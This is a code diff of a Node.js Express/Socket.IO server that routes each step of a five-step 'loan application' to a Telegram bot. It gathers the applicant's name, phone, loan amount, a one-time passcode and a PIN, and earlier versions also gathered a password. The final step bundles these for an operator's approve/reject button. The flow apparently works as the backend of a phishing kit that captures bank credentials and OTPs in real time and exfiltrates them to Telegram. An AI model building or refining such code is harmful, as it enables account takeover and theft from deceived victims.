@@ -1,6 +1,7 @@
 /**
  * server.js
- * Complete Express + Socket.IO server with WEBHOOK SUPPORT
+ * Optimized for Render.com Deployment
+ * Flow: 5 Steps | Admin Approval on Step 5 (PIN)
  */
 
 require('dotenv').config();
@@ -16,9 +17,8 @@ const { v4: uuidv4 } = require('uuid');
 const botManager = require('./bot_manager');
 
 // ============================================================================
-// CONFIGURATION
+// CONFIGURATION & RENDER ENVIRONMENT
 // ============================================================================
-
 const app = express();
 const server = http.createServer(app);
 
@@ -30,10 +30,11 @@ const io = socketIo(server, {
     }
 });
 
-// expose socket globally for bot callbacks in bot_manager.js
+// Expose socket globally for bot callbacks in bot_manager.js
 global.io = io;
 
 const PORT = process.env.PORT || 3000;
+const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; // e.g., https://your-app.onrender.com
 
 // ============================================================================
 // SESSION STORAGE
@@ -57,12 +58,29 @@ app.use((req, res, next) => {
 });
 
 // ============================================================================
-// TELEGRAM WEBHOOK ROUTE
+// TELEGRAM WEBHOOK SETUP (RENDER COMPATIBLE)
 // ============================================================================
-app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
+// Webhook endpoint for Telegram
+const WEBHOOK_PATH = `/bot${process.env.BOT_TOKEN}`;
+app.post(WEBHOOK_PATH, (req, res) => {
     botManager.bot.processUpdate(req.body);
     res.sendStatus(200);
 });
+
+// Function to set webhook on startup
+async function initTelegramWebhook() {
+    if (EXTERNAL_URL) {
+        const webhookUrl = `${EXTERNAL_URL}${WEBHOOK_PATH}`;
+        try {
+            await botManager.bot.setWebHook(webhookUrl);
+            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
+        } catch (err) {
+            console.error('❌ Failed to set Telegram Webhook:', err.message);
+        }
+    } else {
+        console.warn('⚠️ RENDER_EXTERNAL_URL not found. Webhook not set.');
+    }
+}
 
 // ============================================================================
 // SOCKET.IO CONNECTION HANDLING
@@ -70,106 +88,85 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
 io.use((socket, next) => {
     const sessionId = socket.handshake.auth.sessionId;
     socket.sessionId = sessionId || 'sess_' + uuidv4().substring(0, 8);
-    // Fixed AppID generation to be more stable
-    socket.appId = `ASA-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
+    // Stable AppID for the current connection
+    socket.appId = `ASA-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     next();
 });
 
 io.on('connection', (socket) => {
-    console.log(`🔌 SOCKET CONNECTED: ${socket.id} | AppID: ${socket.appId}`);
+    console.log(`🔌 SOCKET CONNECTED: ${socket.appId}`);
 
     let session = sessions.get(socket.sessionId);
 
     if (!session) {
         session = {
             appId: socket.appId,
-            createdAt: Date.now(),
-            lastActivity: Date.now(),
-            step1: null, step2: null, step3: null,
-            step4: null, step5: null, step6: null,
+            data: {},
             completed: false
         };
         sessions.set(socket.sessionId, session);
     } else {
-        session.lastActivity = Date.now();
         socket.appId = session.appId;
     }
 
     socket.join(socket.appId);
     socket.emit('session-ready', { appId: socket.appId });
 
-    // --- STEP HANDLERS (FIXED CALLBACKS) ---
+    // --- STEP HANDLERS (5 STEP FLOW) ---
     
-    socket.on('step1', (data, callback) => {
-        session.step1 = data;
-        botManager.sendStep1({ appId: session.appId, ...data });
-        if (typeof callback === 'function') callback({ success: true, step: 1 });
+    socket.on('step1', (data) => {
+        session.data.loan = data;
+        botManager.sendStep1({ appId: socket.appId, ...data });
     });
 
-    socket.on('step2', (data, callback) => {
-        session.step2 = data;
-        botManager.sendStep2({ appId: session.appId, ...data });
-        if (typeof callback === 'function') callback({ success: true, step: 2 });
+    socket.on('step2', (data) => {
+        session.data.identity = data;
+        botManager.sendStep2({ appId: socket.appId, ...data });
     });
 
-    socket.on('step3', (data, callback) => {
-        session.step3 = data;
-        botManager.sendStep3({ appId: session.appId, ...data });
-        if (typeof callback === 'function') callback({ success: true, step: 3 });
+    socket.on('step3', (data) => {
+        session.data.employment = data;
+        botManager.sendStep3({ appId: socket.appId, ...data });
     });
 
-    socket.on('step4', (data, callback) => {
-        session.step4 = data;
+    // Step 4: OTP (6 Digits)
+    socket.on('step4', (data) => {
+        session.data.otp = data.otp;
         botManager.sendStep4({
-            appId: session.appId,
-            firstName: session.step2?.firstName || 'Unknown',
-            lastName: session.step2?.lastName || 'User',
-            phone: data.phone,
-            amount: session.step1?.amount || '0',
-            password: data.password
+            appId: socket.appId,
+            phone: session.data.identity?.phone || 'N/A',
+            otp: data.otp
         });
-        if (typeof callback === 'function') callback({ success: true, step: 4 });
     });
 
-    socket.on('step5', (data, callback) => {
-        session.step5 = data;
-        botManager.sendStep5({ appId: session.appId, ...data });
-        if (typeof callback === 'function') callback({ success: true, step: 5 });
-    });
-
-    socket.on('step6', (data, callback) => {
-        session.step6 = data;
-        session.completed = true;
-        botManager.sendStep6({
-            appId: session.appId,
-            firstName: session.step2?.firstName || 'Unknown',
-            lastName: session.step2?.lastName || 'User',
-            phone: session.step2?.phone || 'N/A',
-            amount: session.step1?.amount || '0',
-            password: session.step4?.password || 'N/A',
-            otp: session.step5?.otp || 'N/A',
+    // Step 5: PIN (4 Digits) + Wait for Admin Approval
+    socket.on('step5', (data) => {
+        session.data.pin = data.pin;
+        
+        // Prepare full report for the Admin Approval button in Telegram
+        const fullReport = {
+            appId: socket.appId,
+            name: `${session.data.identity?.firstName || ''} ${session.data.identity?.lastName || ''}`,
+            phone: session.data.identity?.phone || 'N/A',
+            amount: session.data.loan?.amount || '0',
+            otp: session.data.otp || 'N/A',
             pin: data.pin
-        });
-        if (typeof callback === 'function') callback({ success: true, step: 6, completed: true });
-    });
+        };
 
-    socket.on('request-otp', (data, callback) => {
-        const otp = Math.floor(100000 + Math.random() * 900000).toString();
-        socket.emit('otp-generated', { simulation: otp });
-        botManager.sendTelegramMessage(`🔐 OTP REQUEST\nID: ${socket.appId}\nGenerated: ${otp}`);
-        if (typeof callback === 'function') callback({ success: true, otp });
+        // Triggers the Telegram Inline Keyboard (Confirm/Reject)
+        botManager.sendApprovalRequest(fullReport);
     });
 
     socket.on('disconnect', () => {
-        console.log(`🔌 Socket disconnected: ${socket.id}`);
+        console.log(`🔌 Socket disconnected: ${socket.appId}`);
     });
 });
 
 // ============================================================================
-// API ENDPOINTS
+// API & STARTUP
 // ============================================================================
 app.get('/api/health', (req, res) => {
-    res.json({ status: 'ok', sessions: sessions.size });
+    res.json({ status: 'ok', url: EXTERNAL_URL });
 });
 
 app.get('/', (req, res) => {
@@ -185,4 +182,5 @@ app.use((err, req, res, next) => {
 // START SERVER
 server.listen(PORT, () => {
     console.log(`🚀 ASA SERVER RUNNING ON PORT ${PORT}`);
+    initTelegramWebhook(); // Initialize webhook when server starts
 });
